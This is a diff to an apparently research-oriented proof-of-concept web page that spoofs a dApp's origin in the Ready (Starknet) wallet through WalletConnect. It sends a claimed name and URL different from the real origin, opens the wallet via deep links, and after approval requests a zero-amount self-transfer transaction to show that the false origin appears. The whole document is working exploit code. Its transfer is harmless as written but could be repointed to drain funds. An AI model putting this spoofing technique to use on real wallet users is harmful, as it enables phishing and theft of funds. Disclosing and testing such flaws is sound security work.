@@ -6,7 +6,7 @@
 </head>
 <body>
   <h1>Ready Wallet Origin Spoof PoC</h1>
-  <button id="connect">Spoof connect prompt</button>
+  <button id="connect">Connect + Spoof</button>
   <pre id="log"></pre>
 
   <script type="module">
@@ -20,11 +20,15 @@
       document.getElementById('log').textContent += msg + '\n';
     };
 
+    let provider = null;
+    let session = null;
+    let account = null;
+
     document.getElementById('connect').onclick = async () => {
       try {
         log('Initializing...');
 
-        const provider = await UniversalProvider.init({
+        provider = await UniversalProvider.init({
           projectId: '2f05ae7f1116030fde2d36508f472bfb',
           metadata: {
             name: CLAIMED_NAME,
@@ -37,11 +41,14 @@
 
         log('Provider ready!');
 
-        const { uri } = await provider.client.connect({
+        const { uri, approval } = await provider.client.connect({
           requiredNamespaces: {
             starknet: {
               chains: ['starknet:SNMAIN'],
-              methods: ['starknet_account'],
+              methods: [
+                'starknet_account',
+                'starknet_requestAddInvokeTransaction'
+              ],
               events: ['accountsChanged']
             }
           }
@@ -50,27 +57,89 @@
         if (uri) {
           log('Real origin: ' + REAL_ORIGIN);
           log('Claimed URL: ' + CLAIMED_URL);
-          log('URI generated: ' + uri.substring(0, 50) + '...');
+          log('URI: ' + uri.substring(0, 60) + '...');
 
-          // Coba semua scheme satu per satu
-          const schemes = [
-            `ready://wc?uri=${encodeURIComponent(uri)}`,
-            `argentmobile://wc?uri=${encodeURIComponent(uri)}`,
-            `argent://wc?uri=${encodeURIComponent(uri)}`,
-            `wc://wc?uri=${encodeURIComponent(uri)}`
-          ];
+          // Buka Ready Wallet dengan URI
+          log('Opening Ready Wallet...');
+          window.location.href = 'ready://' ;
+          
+          await new Promise(r => setTimeout(r, 1500));
+          
+          // Setelah wallet terbuka, kirim URI nya
+          window.location.href = `ready://wc?uri=${encodeURIComponent(uri)}`;
 
-          for (const scheme of schemes) {
-            const name = scheme.split('://')[0];
-            log('Trying scheme: ' + name + '://');
-            location.href = scheme;
-            await new Promise(r => setTimeout(r, 3000));
+          log('Waiting for approval...');
+
+          // Tunggu user approve di wallet
+          session = await approval();
+          log('Session approved!');
+
+          // Ambil account
+          const starknetAccounts = session?.namespaces?.starknet?.accounts;
+          if (starknetAccounts?.length > 0) {
+            account = starknetAccounts[0].split(':')[2];
+            log('Account: ' + account);
+
+            // Langsung coba send transaction untuk test origin spoof
+            await sendTransaction();
           }
-
-          log('Semua scheme sudah dicoba!');
         }
       } catch(e) {
         log('Error: ' + e.message);
+      }
+    };
+
+    const sendTransaction = async () => {
+      if (!provider || !session || !account) {
+        log('Missing provider/session/account!');
+        return;
+      }
+
+      try {
+        log('Opening Ready for transaction...');
+
+        // Buka Ready Wallet dulu
+        window.location.href = 'ready://';
+        await new Promise(r => setTimeout(r, 1500));
+
+        const transaction = {
+          accountAddress: account,
+          executionRequest: {
+            calls: [
+              {
+                contractAddress: '0x049d36570d4e46f48e99674bd3fcc84644ddd6b96f7c741b1562b82f9e004dc7',
+                entrypoint: 'transfer',
+                calldata: [
+                  account,  // to (self)
+                  '0x0',    // amount low
+                  '0x0'     // amount high
+                ]
+              }
+            ]
+          }
+        };
+
+        log('Sending transaction request...');
+
+        const result = await provider.client.request({
+          topic: session.topic,
+          chainId: 'starknet:SNMAIN',
+          request: {
+            method: 'starknet_requestAddInvokeTransaction',
+            params: {
+              accountAddress: transaction.accountAddress,
+              executionRequest: transaction.executionRequest
+            }
+          }
+        });
+
+        if (result?.transaction_hash) {
+          log('TX Hash: ' + result.transaction_hash);
+          log('Origin shown in wallet should be: ' + CLAIMED_URL);
+          log('But real origin is: ' + REAL_ORIGIN);
+        }
+      } catch(err) {
+        log('TX Error: ' + err.message);
       }
     };
   </script>
